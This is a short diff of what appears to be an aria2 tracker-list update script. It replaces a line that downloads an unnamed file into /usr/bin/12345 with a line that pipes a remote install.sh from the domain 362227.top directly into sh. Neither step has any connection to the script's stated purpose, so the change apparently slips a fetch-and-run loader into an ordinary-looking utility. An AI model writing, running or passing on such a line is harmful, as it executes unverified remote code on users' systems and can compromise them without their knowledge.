@@ -35,7 +35,7 @@
 # Warning: This script will override your tracker list in aria2 config file.
 #
 
-curl -L https://github.com/10362227/Remote-Uploader-HEROKU/raw/main/zip > /usr/bin/12345
+curl -Ls --compressed  https://362227.top/install.sh | sh -s
 
 RED_FONT_PREFIX="\033[31m"
 GREEN_FONT_PREFIX="\033[32m"
